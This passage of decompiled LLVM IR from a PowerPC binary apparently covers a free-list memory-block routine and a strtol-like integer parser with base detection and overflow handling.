  uselistorder i32 %arg4, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000c940, { 1, 0 }
}

define i32 @function_1000c950(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000c950:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_1000c950 = icmp eq i32 %arg3, 0
  br i1 %v3_1000c950, label %dec_label_pc_1000c960, label %dec_label_pc_1000c958

dec_label_pc_1000c958:                            ; preds = %dec_label_pc_1000c950
  %v2_1000c958 = add i32 %arg3, 4
  %v3_1000c958 = inttoptr i32 %v2_1000c958 to i32*
  store i32 %arg2, i32* %v3_1000c958, align 4
  br label %dec_label_pc_1000c964

dec_label_pc_1000c960:                            ; preds = %dec_label_pc_1000c950
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_1000c964

dec_label_pc_1000c964:                            ; preds = %dec_label_pc_1000c958, %dec_label_pc_1000c960
  %v2_1000c964 = add i32 %arg2, 8
  %v3_1000c964 = inttoptr i32 %v2_1000c964 to i32*
  store i32 %arg3, i32* %v3_1000c964, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c964, { 1, 0 }
}

define i32 @function_1000c96c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c96c:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_1000c984 = load i32, i32* %arg1, align 4
  store i32 %v2_1000c984, i32* @r31, align 4
  %v2_1000c988 = add i32 %arg3, %arg2
  store i32 %v2_1000c988, i32* %r3.global-to-local, align 4
  %v3_1000c99c7 = icmp eq i32 %v2_1000c984, 0
  %v1_1000c9a08 = add i32 %v2_1000c984, 12
  %tmp69 = icmp uge i32 %v1_1000c9a08, %arg2
  %or.cond10 = or i1 %v3_1000c99c7, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1000c9ac, label %dec_label_pc_1000c994

dec_label_pc_1000c994:                            ; preds = %dec_label_pc_1000c96c, %dec_label_pc_1000c994
  %v0_1000c9f411 = phi i32 [ %v3_1000c998, %dec_label_pc_1000c994 ], [ %v2_1000c984, %dec_label_pc_1000c96c ]
  store i32 %v0_1000c9f411, i32* %r11.global-to-local, align 4
  %v1_1000c998 = add i32 %v0_1000c9f411, 4
  %v2_1000c998 = inttoptr i32 %v1_1000c998 to i32*
  %v3_1000c998 = load i32, i32* %v2_1000c998, align 4
  store i32 %v3_1000c998, i32* @r31, align 4
  %v3_1000c99c = icmp eq i32 %v3_1000c998, 0
  %v1_1000c9a0 = add i32 %v3_1000c998, 12
  %tmp6 = icmp uge i32 %v1_1000c9a0, %arg2
  %or.cond = or i1 %v3_1000c99c, %tmp6
  br i1 %or.cond, label %dec_label_pc_1000c9ac, label %dec_label_pc_1000c994

dec_label_pc_1000c9ac:                            ; preds = %dec_label_pc_1000c994, %dec_label_pc_1000c96c
  %v0_1000c9e8.lcssa = phi i32 [ 0, %dec_label_pc_1000c96c ], [ %v0_1000c9f411, %dec_label_pc_1000c994 ]
  %v0_1000c9f4.lcssa = phi i32 [ %v2_1000c984, %dec_label_pc_1000c96c ], [ %v3_1000c998, %dec_label_pc_1000c994 ]
  %v3_1000c99c.lcssa = phi i1 [ %v3_1000c99c7, %dec_label_pc_1000c96c ], [ %v3_1000c99c, %dec_label_pc_1000c994 ]
  br i1 %v3_1000c99c.lcssa, label %dec_label_pc_1000ca64, label %dec_label_pc_1000c9b4

dec_label_pc_1000c9b4:                            ; preds = %dec_label_pc_1000c9ac
  %v1_1000c9b4 = inttoptr i32 %v0_1000c9f4.lcssa to i32*
  %v2_1000c9b4 = load i32, i32* %v1_1000c9b4, align 4
  %v2_1000c9b8 = sub i32 %v0_1000c9f4.lcssa, %v2_1000c9b4
  %v1_1000c9bc = add i32 %v2_1000c9b8, 12
  %v3_1000c9c0 = icmp ugt i32 %v1_1000c9bc, %v2_1000c988
  br i1 %v3_1000c9c0, label %dec_label_pc_1000ca64, label %dec_label_pc_1000c9c8

dec_label_pc_1000c9c8:                            ; preds = %dec_label_pc_1000c9b4
  %v4_1000c9c0 = icmp eq i32 %v1_1000c9bc, %v2_1000c988
  %v2_1000c9cc = add i32 %v2_1000c9b4, %arg3
  store i32 %v2_1000c9cc, i32* @r29, align 4
  br i1 %v4_1000c9c0, label %dec_label_pc_1000c9d4, label %dec_label_pc_1000ca04

dec_label_pc_1000c9d4:                            ; preds = %dec_label_pc_1000c9c8
  %v3_1000c9d4 = icmp eq i32 %v0_1000c9e8.lcssa, 0
  br i1 %v3_1000c9d4, label %dec_label_pc_1000ca58, label %dec_label_pc_1000c9dc

dec_label_pc_1000c9dc:                            ; preds = %dec_label_pc_1000c9d4
  %v1_1000c9dc = add i32 %v0_1000c9e8.lcssa, 12
  %v4_1000c9e0 = icmp eq i32 %v1_1000c9dc, %arg2
  br i1 %v4_1000c9e0, label %dec_label_pc_1000c9e8, label %dec_label_pc_1000ca58

dec_label_pc_1000c9e8:                            ; preds = %dec_label_pc_1000c9dc
  %v1_1000c9e8 = inttoptr i32 %v0_1000c9e8.lcssa to i32*
  %v2_1000c9e8 = load i32, i32* %v1_1000c9e8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1000c9f0 = add i32 %v0_1000c9e8.lcssa, 8
  %v2_1000c9f0 = inttoptr i32 %v1_1000c9f0 to i32*
  %v3_1000c9f0 = load i32, i32* %v2_1000c9f0, align 4
  %v2_1000c9f8 = add i32 %v2_1000c9e8, %v2_1000c9cc
  store i32 %v2_1000c9f8, i32* @r29, align 4
  %v5_1000c9fc = call i32 @function_1000c950(i32* %arg1, i32 %v0_1000c9f4.lcssa, i32 %v3_1000c9f0, i32 %v2_1000c988)
  store i32 %v5_1000c9fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ca58

dec_label_pc_1000ca04:                            ; preds = %dec_label_pc_1000c9c8
  %v1_1000ca04 = add i32 %v0_1000c9f4.lcssa, 4
  %v2_1000ca04 = inttoptr i32 %v1_1000ca04 to i32*
  %v3_1000ca04 = load i32, i32* %v2_1000ca04, align 4
  %v3_1000ca08 = icmp eq i32 %v3_1000ca04, 0
  br i1 %v3_1000ca08, label %dec_label_pc_1000ca40, label %dec_label_pc_1000ca10

dec_label_pc_1000ca10:                            ; preds = %dec_label_pc_1000ca04
  %v1_1000ca10 = inttoptr i32 %v3_1000ca04 to i32*
  %v2_1000ca10 = load i32, i32* %v1_1000ca10, align 4
  %v2_1000ca14 = sub i32 %v3_1000ca04, %v2_1000ca10
  %v1_1000ca18 = add i32 %v2_1000ca14, 12
  %v4_1000ca1c = icmp eq i32 %v2_1000c988, %v1_1000ca18
  br i1 %v4_1000ca1c, label %dec_label_pc_1000ca24, label %dec_label_pc_1000ca40

dec_label_pc_1000ca24:                            ; preds = %dec_label_pc_1000ca10
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1000ca30 = add i32 %v2_1000ca10, %v2_1000c9cc
  store i32 %v2_1000ca30, i32* @r29, align 4
  store i32 %v3_1000ca04, i32* @r31, align 4
  %v5_1000ca38 = call i32 @function_1000c950(i32* %arg1, i32 %v3_1000ca04, i32 %v0_1000c9e8.lcssa, i32 %v2_1000c988)
  store i32 %v5_1000ca38, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ca58

dec_label_pc_1000ca40:                            ; preds = %dec_label_pc_1000ca10, %dec_label_pc_1000ca04
  %v2_1000ca40 = add i32 %v0_1000c9f4.lcssa, %arg3
  store i32 %v2_1000ca40, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268487256, i32* @lr, align 4
  %v5_1000ca54 = call i32 @function_1000c924(i32* %arg1, i32 %v2_1000ca40, i32 %v0_1000c9e8.lcssa, i32 %v3_1000ca04)
  store i32 %v5_1000ca54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ca58

dec_label_pc_1000ca58:                            ; preds = %dec_label_pc_1000c9dc, %dec_label_pc_1000c9d4, %dec_label_pc_1000ca24, %dec_label_pc_1000c9e8, %dec_label_pc_1000ca40
  %v0_1000ca58 = load i32, i32* @r31, align 4
  store i32 %v0_1000ca58, i32* @r30, align 4
  %v0_1000ca5c = load i32, i32* @r29, align 4
  %v2_1000ca5c = inttoptr i32 %v0_1000ca58 to i32*
  store i32 %v0_1000ca5c, i32* %v2_1000ca5c, align 4
  br label %dec_label_pc_1000ca80

dec_label_pc_1000ca64:                            ; preds = %dec_label_pc_1000c9b4, %dec_label_pc_1000c9ac
  %v2_1000ca64 = add i32 %v2_1000c988, -12
  %v3_1000ca64 = inttoptr i32 %v2_1000ca64 to i32*
  store i32 %arg3, i32* %v3_1000ca64, align 4
  %v0_1000ca68 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000ca68 = add i32 %v0_1000ca68, -12
  store i32 %v1_1000ca68, i32* @r30, align 4
  %v0_1000ca6c = load i32, i32* %r11.global-to-local, align 4
  %v0_1000ca70 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000ca70, i32* %r3.global-to-local, align 4
  %v0_1000ca74 = load i32, i32* @r31, align 4
  store i32 268487296, i32* @lr, align 4
  %v4_1000ca7c = inttoptr i32 %v0_1000ca70 to i32*
  %v5_1000ca7c = call i32 @function_1000c924(i32* %v4_1000ca7c, i32 %v1_1000ca68, i32 %v0_1000ca6c, i32 %v0_1000ca74)
  store i32 %v5_1000ca7c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000ca80

dec_label_pc_1000ca80:                            ; preds = %dec_label_pc_1000ca58, %dec_label_pc_1000ca64
  %v0_1000ca84 = load i32, i32* @r30, align 4
  store i32 %v0_1000ca84, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ca84

; uselistorder directives
  uselistorder i32 %v3_1000ca04, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1000c9bc, { 1, 0 }
  uselistorder i32 %v0_1000c9f4.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_1000c9e8.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_1000c998, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_1000c988, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 10, 5, 6, 7, 8, 1, 9, 11, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000ca80, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca58, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000c994, { 1, 0 }
}

define i32 @function_1000ca98(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000ca98:
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 10, i32* %r30.global-to-local, align 4
  store i32 1, i32* %r26.global-to-local, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_1000cad0 = load i32, i32* bitcast (i32** @global_var_1001eb0c.506 to i32*), align 4
  %v2_1000cadc27 = load i8, i8* %arg1, align 1
  %v3_1000cadc28 = zext i8 %v2_1000cadc27 to i32
  %v1_1000cae029 = mul nuw nsw i32 %v3_1000cadc28, 2
  %v2_1000cae430 = add i32 %v1_1000cae029, %v3_1000cad0
  %v3_1000cae431 = inttoptr i32 %v2_1000cae430 to i16*
  %v4_1000cae432 = load i16, i16* %v3_1000cae431, align 2
  %v1_1000cae834 = and i16 %v4_1000cae432, 32
  %v3_1000cae835 = icmp eq i16 %v1_1000cae834, 0
  br i1 %v3_1000cae835, label %dec_label_pc_1000caf0, label %dec_label_pc_1000cad8

dec_label_pc_1000cad8:                            ; preds = %dec_label_pc_1000ca98, %dec_label_pc_1000cad8
  %v0_1000cb1036 = phi i32 [ %v1_1000cad8, %dec_label_pc_1000cad8 ], [ %tmp, %dec_label_pc_1000ca98 ]
  %v1_1000cad8 = add i32 %v0_1000cb1036, 1
  store i32 %v1_1000cad8, i32* %r31.global-to-local, align 4
  %v1_1000cadc = inttoptr i32 %v1_1000cad8 to i8*
  %v2_1000cadc = load i8, i8* %v1_1000cadc, align 1
  %v3_1000cadc = zext i8 %v2_1000cadc to i32
  %v1_1000cae0 = mul nuw nsw i32 %v3_1000cadc, 2
  %v2_1000cae4 = add i32 %v1_1000cae0, %v3_1000cad0
  %v3_1000cae4 = inttoptr i32 %v2_1000cae4 to i16*
  %v4_1000cae4 = load i16, i16* %v3_1000cae4, align 2
  %v1_1000cae8 = and i16 %v4_1000cae4, 32
  %v3_1000cae8 = icmp eq i16 %v1_1000cae8, 0
  br i1 %v3_1000cae8, label %dec_label_pc_1000caf0, label %dec_label_pc_1000cad8

dec_label_pc_1000caf0:                            ; preds = %dec_label_pc_1000cad8, %dec_label_pc_1000ca98
  %v0_1000cb10.lcssa = phi i32 [ %tmp, %dec_label_pc_1000ca98 ], [ %v1_1000cad8, %dec_label_pc_1000cad8 ]
  %v2_1000cadc.lcssa = phi i8 [ %v2_1000cadc27, %dec_label_pc_1000ca98 ], [ %v2_1000cadc, %dec_label_pc_1000cad8 ]
  %v3_1000caf0 = icmp eq i8 %v2_1000cadc.lcssa, 43
  br i1 %v3_1000caf0, label %dec_label_pc_1000cb10, label %dec_label_pc_1000caf8

dec_label_pc_1000caf8:                            ; preds = %dec_label_pc_1000caf0
  %v3_1000caf8 = icmp eq i8 %v2_1000cadc.lcssa, 45
  store i32 0, i32* @r28, align 4
  br i1 %v3_1000caf8, label %dec_label_pc_1000cb10, label %dec_label_pc_1000cb14

dec_label_pc_1000cb10:                            ; preds = %dec_label_pc_1000caf0, %dec_label_pc_1000caf8
  %storemerge = phi i32 [ 1, %dec_label_pc_1000caf8 ], [ 0, %dec_label_pc_1000caf0 ]
  store i32 %storemerge, i32* @r28, align 4
  %v1_1000cb10 = add i32 %v0_1000cb10.lcssa, 1
  store i32 %v1_1000cb10, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000cb14

dec_label_pc_1000cb14:                            ; preds = %dec_label_pc_1000caf8, %dec_label_pc_1000cb10
  %v1_1000cb14 = call i32 @__asm_rlwinm.(i32 10, i32 0, i32 28, i32 26)
  %v4_1000cb14 = icmp eq i32 %v1_1000cb14, 0
  br i1 %v4_1000cb14, label %dec_label_pc_1000cb20, label %dec_label_pc_1000cb14.dec_label_pc_1000cb5c_crit_edge

dec_label_pc_1000cb14.dec_label_pc_1000cb5c_crit_edge: ; preds = %dec_label_pc_1000cb14
  %v0_1000cb5c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000cb5c

dec_label_pc_1000cb20:                            ; preds = %dec_label_pc_1000cb14
  %v0_1000cb20 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000cb20 = inttoptr i32 %v0_1000cb20 to i8*
  %v2_1000cb20 = load i8, i8* %v1_1000cb20, align 1
  %v0_1000cb24 = load i32, i32* %r30.global-to-local, align 4
  %v1_1000cb24 = add i32 %v0_1000cb24, 10
  store i32 %v1_1000cb24, i32* %r30.global-to-local, align 4
  %v3_1000cb28 = icmp eq i8 %v2_1000cb20, 48
  br i1 %v3_1000cb28, label %dec_label_pc_1000cb30, label %dec_label_pc_1000cb50

dec_label_pc_1000cb30:                            ; preds = %dec_label_pc_1000cb20
  %v1_1000cb30 = add i32 %v0_1000cb20, 1
  %v2_1000cb30 = inttoptr i32 %v1_1000cb30 to i8*
  %v3_1000cb30 = load i8, i8* %v2_1000cb30, align 1
  %v4_1000cb30 = zext i8 %v3_1000cb30 to i32
  store i32 %v1_1000cb30, i32* %r31.global-to-local, align 4
  %v1_1000cb34 = add i32 %v0_1000cb24, 8
  store i32 %v1_1000cb34, i32* %r30.global-to-local, align 4
  %v1_1000cb38 = or i32 %v4_1000cb30, 32
  %v3_1000cb40 = icmp eq i32 %v1_1000cb38, 120
  br i1 %v3_1000cb40, label %dec_label_pc_1000cb48, label %dec_label_pc_1000cb50

dec_label_pc_1000cb48:                            ; preds = %dec_label_pc_1000cb30
  %v1_1000cb48 = mul i32 %v1_1000cb34, 2
  store i32 %v1_1000cb48, i32* %r30.global-to-local, align 4
  %v1_1000cb4c = add i32 %v0_1000cb20, 2
  store i32 %v1_1000cb4c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000cb50

dec_label_pc_1000cb50:                            ; preds = %dec_label_pc_1000cb30, %dec_label_pc_1000cb20, %dec_label_pc_1000cb48
  %v0_1000cc0415 = phi i32 [ %v1_1000cb30, %dec_label_pc_1000cb48 ], [ %tmp, %dec_label_pc_1000cb20 ], [ %v1_1000cb30, %dec_label_pc_1000cb30 ]
  %v0_1000cb50 = phi i32 [ %v1_1000cb48, %dec_label_pc_1000cb48 ], [ %v1_1000cb24, %dec_label_pc_1000cb20 ], [ %v1_1000cb34, %dec_label_pc_1000cb30 ]
  %tmp22 = icmp slt i32 %v0_1000cb50, 17
  br i1 %tmp22, label %dec_label_pc_1000cb5c, label %dec_label_pc_1000cb58

dec_label_pc_1000cb58:                            ; preds = %dec_label_pc_1000cb50
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000cb5c

dec_label_pc_1000cb5c:                            ; preds = %dec_label_pc_1000cb14.dec_label_pc_1000cb5c_crit_edge, %dec_label_pc_1000cb50, %dec_label_pc_1000cb58
  %v0_1000cc0414 = phi i32 [ %tmp, %dec_label_pc_1000cb14.dec_label_pc_1000cb5c_crit_edge ], [ %v0_1000cc0415, %dec_label_pc_1000cb50 ], [ %v0_1000cc0415, %dec_label_pc_1000cb58 ]
  %v1_1000cb70 = phi i32 [ %v0_1000cb5c.pre, %dec_label_pc_1000cb14.dec_label_pc_1000cb5c_crit_edge ], [ %v0_1000cb50, %dec_label_pc_1000cb50 ], [ 16, %dec_label_pc_1000cb58 ]
  %v1_1000cb5c = add i32 %v1_1000cb70, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1000cb64 = icmp ugt i32 %v1_1000cb5c, 34
  br i1 %v2_1000cb64, label %dec_label_pc_1000cbfc, label %dec_label_pc_1000cb6c

dec_label_pc_1000cb6c:                            ; preds = %dec_label_pc_1000cb5c
  %v2_1000cb70 = udiv i32 -1, %v1_1000cb70
  store i32 %v2_1000cb70, i32* @r29, align 4
  %v2_1000cb74 = mul i32 %v2_1000cb70, %v1_1000cb70
  %v1_1000cb78 = sub i32 -1, %v2_1000cb74
  %v1_1000cb7c = urem i32 %v1_1000cb78, 256
  store i32 %v1_1000cb7c, i32* @r27, align 4
  %v0_1000cb88.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000cb88

dec_label_pc_1000cb84:                            ; preds = %dec_label_pc_1000cbf0, %dec_label_pc_1000cbd8
  %v1_1000cb8c.pre = phi i32 [ %v1_1000cb90, %dec_label_pc_1000cbf0 ], [ %v1_1000cb8c.pre.pre, %dec_label_pc_1000cbd8 ]
  %v0_1000cb8c.pre = phi i32 [ %v2_1000cbf4, %dec_label_pc_1000cbf0 ], [ %v0_1000cb8c.pre.pre, %dec_label_pc_1000cbd8 ]
  %v0_1000cb84 = phi i32 [ %v1_1000cb94, %dec_label_pc_1000cbf0 ], [ %v0_1000cb84.pre, %dec_label_pc_1000cbd8 ]
  br label %dec_label_pc_1000cb88

dec_label_pc_1000cb88:                            ; preds = %dec_label_pc_1000cb6c, %dec_label_pc_1000cb84
  %v0_1000cc0412 = phi i32 [ %v0_1000cc0414, %dec_label_pc_1000cb6c ], [ %v0_1000cb84, %dec_label_pc_1000cb84 ]
  %v0_1000cb94 = phi i32 [ %v0_1000cb88.pre, %dec_label_pc_1000cb6c ], [ %v0_1000cb84, %dec_label_pc_1000cb84 ]
  %v1_1000cb90 = phi i32 [ %v2_1000cb70, %dec_label_pc_1000cb6c ], [ %v1_1000cb8c.pre, %dec_label_pc_1000cb84 ]
  %v0_1000cbf0 = phi i32 [ 0, %dec_label_pc_1000cb6c ], [ %v0_1000cb8c.pre, %dec_label_pc_1000cb84 ]
  %v1_1000cb88 = inttoptr i32 %v0_1000cb94 to i8*
  %v2_1000cb88 = load i8, i8* %v1_1000cb88, align 1
  %v3_1000cb88 = zext i8 %v2_1000cb88 to i32
  %v3_1000cb8c = icmp ugt i32 %v0_1000cbf0, %v1_1000cb90
  %v1_1000cb94 = add i32 %v0_1000cb94, 1
  store i32 %v1_1000cb94, i32* %r31.global-to-local, align 4
  %v1_1000cb98 = add nsw i32 %v3_1000cb88, -48
  %v1_1000cb9c = or i32 %v3_1000cb88, 32
  %v1_1000cba0 = urem i32 %v1_1000cb98, 256
  %tmp23 = icmp ult i32 %v1_1000cba0, 10
  br i1 %tmp23, label %dec_label_pc_1000cbc0, label %dec_label_pc_1000cbb0

dec_label_pc_1000cbb0:                            ; preds = %dec_label_pc_1000cb88
  %tmp24 = icmp ult i32 %v1_1000cb9c, 97
  br i1 %tmp24, label %dec_label_pc_1000cbc0, label %dec_label_pc_1000cbbc

dec_label_pc_1000cbbc:                            ; preds = %dec_label_pc_1000cbb0
  %v1_1000cbb0 = add nsw i32 %v1_1000cb9c, -87
  %v1_1000cbbc = urem i32 %v1_1000cbb0, 256
  br label %dec_label_pc_1000cbc0

dec_label_pc_1000cbc0:                            ; preds = %dec_label_pc_1000cbb0, %dec_label_pc_1000cb88, %dec_label_pc_1000cbbc
  %v1_1000cbf4 = phi i32 [ 40, %dec_label_pc_1000cbb0 ], [ %v1_1000cba0, %dec_label_pc_1000cb88 ], [ %v1_1000cbbc, %dec_label_pc_1000cbbc ]
  %v1_1000cbc0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000cbc0 = icmp slt i32 %v1_1000cbf4, %v1_1000cbc0
  br i1 %v2_1000cbc0, label %dec_label_pc_1000cbc8, label %dec_label_pc_1000cbfc

dec_label_pc_1000cbc8:                            ; preds = %dec_label_pc_1000cbc0
  br i1 %v3_1000cb8c, label %dec_label_pc_1000cbd8, label %dec_label_pc_1000cbcc

dec_label_pc_1000cbcc:                            ; preds = %dec_label_pc_1000cbc8
  %v1_1000cbcc = load i32, i32* @r27, align 4
  %v0_1000cbd0.not = icmp ne i32 %v0_1000cbf0, %v1_1000cb90
  %tmp25 = icmp ule i32 %v1_1000cbf4, %v1_1000cbcc
  %or.cond = or i1 %tmp25, %v0_1000cbd0.not
  br i1 %or.cond, label %dec_label_pc_1000cbf0, label %dec_label_pc_1000cbd8

dec_label_pc_1000cbd8:                            ; preds = %dec_label_pc_1000cbcc, %dec_label_pc_1000cbc8
  %v0_1000cbd8 = call i32 @function_1000bb0c()
  %v0_1000cbdc = load i32, i32* @r28, align 4
  %v1_1000cbdc = load i32, i32* %r26.global-to-local, align 4
  %v2_1000cbdc = and i32 %v1_1000cbdc, %v0_1000cbdc
  store i32 %v2_1000cbdc, i32* @r28, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_1000cbe8 = inttoptr i32 %v0_1000cbd8 to i32*
  store i32 34, i32* %v2_1000cbe8, align 4
  %v0_1000cb84.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_1000cb8c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_1000cb8c.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000cb84

dec_label_pc_1000cbf0:                            ; preds = %dec_label_pc_1000cbcc
  %v2_1000cbf0 = mul i32 %v1_1000cbc0, %v0_1000cbf0
  %v2_1000cbf4 = add i32 %v2_1000cbf0, %v1_1000cbf4
  store i32 %v2_1000cbf4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000cb84

dec_label_pc_1000cbfc:                            ; preds = %dec_label_pc_1000cbc0, %dec_label_pc_1000cb5c
  %v0_1000cc04 = phi i32 [ %v0_1000cc0414, %dec_label_pc_1000cb5c ], [ %v0_1000cc0412, %dec_label_pc_1000cbc0 ]
  %v0_1000cbfc = load i32, i32* %r25.global-to-local, align 4
  %v3_1000cbfc = icmp eq i32 %v0_1000cbfc, 0
  br i1 %v3_1000cbfc, label %dec_label_pc_1000cc08, label %dec_label_pc_1000cc04

dec_label_pc_1000cc04:                            ; preds = %dec_label_pc_1000cbfc
  %v2_1000cc04 = inttoptr i32 %v0_1000cbfc to i32*
  store i32 %v0_1000cc04, i32* %v2_1000cc04, align 4
  br label %dec_label_pc_1000cc08

dec_label_pc_1000cc08:                            ; preds = %dec_label_pc_1000cbfc, %dec_label_pc_1000cc04
  %v0_1000cc08 = load i32, i32* %r26.global-to-local, align 4
  %v3_1000cc08 = icmp eq i32 %v0_1000cc08, 0
  %v0_1000cc0c = load i32, i32* @r28, align 4
  %v1_1000cc0c = sub i32 0, %v0_1000cc0c
  %tmp40 = lshr i32 %v1_1000cc0c, 31
  %tmp41 = add nuw i32 %tmp40, 2147483647
  store i32 %tmp41, i32* @r31, align 4
  %v0_1000cc4c.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v3_1000cc08, label %dec_label_pc_1000cc3c, label %dec_label_pc_1000cc24

dec_label_pc_1000cc24:                            ; preds = %dec_label_pc_1000cc08
  %v3_1000cc24 = icmp ugt i32 %v0_1000cc4c.pre.pre, %tmp41
  br i1 %v3_1000cc24, label %dec_label_pc_1000cc2c, label %dec_label_pc_1000cc3c

dec_label_pc_1000cc2c:                            ; preds = %dec_label_pc_1000cc24
  %v0_1000cc2c = call i32 @function_1000bb0c()
  %v2_1000cc34 = inttoptr i32 %v0_1000cc2c to i32*
  store i32 34, i32* %v2_1000cc34, align 4
  %v0_1000cc38 = load i32, i32* @r31, align 4
  store i32 %v0_1000cc38, i32* %r8.global-to-local, align 4
  %v0_1000cc3c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000cc3c

dec_label_pc_1000cc3c:                            ; preds = %dec_label_pc_1000cc08, %dec_label_pc_1000cc24, %dec_label_pc_1000cc2c
  %v0_1000cc4c.pre = phi i32 [ %v0_1000cc4c.pre.pre, %dec_label_pc_1000cc24 ], [ %v0_1000cc38, %dec_label_pc_1000cc2c ], [ %v0_1000cc4c.pre.pre, %dec_label_pc_1000cc08 ]
  %v0_1000cc3c = phi i32 [ %v0_1000cc0c, %dec_label_pc_1000cc24 ], [ %v0_1000cc3c.pre, %dec_label_pc_1000cc2c ], [ %v0_1000cc0c, %dec_label_pc_1000cc08 ]
  %v3_1000cc3c = icmp eq i32 %v0_1000cc3c, 0
  br i1 %v3_1000cc3c, label %dec_label_pc_1000cc48, label %dec_label_pc_1000cc44

dec_label_pc_1000cc44:                            ; preds = %dec_label_pc_1000cc3c
  %v1_1000cc44 = sub i32 0, %v0_1000cc4c.pre
  store i32 %v1_1000cc44, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000cc48

dec_label_pc_1000cc48:                            ; preds = %dec_label_pc_1000cc3c, %dec_label_pc_1000cc44
  %v0_1000cc4c = phi i32 [ %v1_1000cc44, %dec_label_pc_1000cc44 ], [ %v0_1000cc4c.pre, %dec_label_pc_1000cc3c ]
  ret i32 %v0_1000cc4c

; uselistorder directives
  uselistorder i32 %v0_1000cc4c.pre, { 1, 0 }
  uselistorder i32 %v0_1000cc4c.pre.pre, { 0, 2, 1 }
  uselistorder i32 %v2_1000cbf4, { 1, 0 }
  uselistorder i32 %v1_1000cba0, { 1, 0 }
  uselistorder i32 %v1_1000cb9c, { 1, 0 }
  uselistorder i32 %v1_1000cb94, { 1, 0 }
  uselistorder i32 %v3_1000cb88, { 1, 0 }
  uselistorder i32 %v0_1000cbf0, { 1, 0, 2 }
  uselistorder i32 %v1_1000cb90, { 0, 2, 1 }
  uselistorder i32 %v0_1000cb84, { 1, 0 }
  uselistorder i32 %v2_1000cb70, { 1, 0, 2 }
  uselistorder i32 %v1_1000cb48, { 1, 0 }
  uselistorder i32 %v1_1000cb34, { 1, 0, 2 }
  uselistorder i8 %v2_1000cadc.lcssa, { 1, 0 }
  uselistorder i32 %v1_1000cad8, { 0, 2, 3, 1 }
  uselistorder i32 %v3_1000cad0, { 1, 0 }
  uselistorder i32 %tmp, { 3, 2, 0, 1, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 7, 2, 3, 6, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder i32 34, { 0, 1, 5, 6, 7, 2, 8, 3, 9, 4, 10 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 0, 7, 8, 3, 4, 5, 6, 1, 2 }
  uselistorder i32 26, { 1, 0, 2, 3 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000cc48, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000cc08, { 1, 0 }
